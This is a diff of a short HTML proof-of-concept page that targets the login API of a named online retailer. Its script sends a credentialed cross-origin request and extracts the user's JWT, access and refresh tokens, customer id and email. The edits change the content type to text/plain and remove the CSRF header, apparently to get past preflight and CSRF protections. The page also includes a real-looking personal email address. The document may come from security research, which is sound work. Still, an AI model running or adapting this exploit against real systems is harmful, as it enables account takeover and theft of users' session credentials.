@@ -4,16 +4,14 @@
   <title>Takealot CORS PoC</title>
 </head>
 <body>
-<h1>Takealot CORS PoC - JWT Theft via Login</h1>
-<p>Simulating cross-origin login credential theft...</p>
+<h1>Takealot CORS PoC</h1>
 <pre id="output">Loading...</pre>
 <script>
   fetch("https://api.takealot.com/rest/v-1-16-0/customers/login?section_id=customer_login", {
     method: "POST",
     credentials: "include",
     headers: {
-      "Content-Type": "application/json",
-      "X-Csrf-Token": "d41d8cd9"
+      "Content-Type": "text/plain"
     },
     body: JSON.stringify({
       email: "bettridgeconnor@gmail.com",
@@ -26,7 +24,6 @@
       jwt: data.auth_info?.jwt,
       access_token: data.auth_info?.access_token,
       refresh_token: data.auth_info?.refresh_token,
-      csrf_token: data.auth_info?.csrf_token,
       customer_id: data.auth_info?.customer_id,
       email: data.auth_info?.email
     }
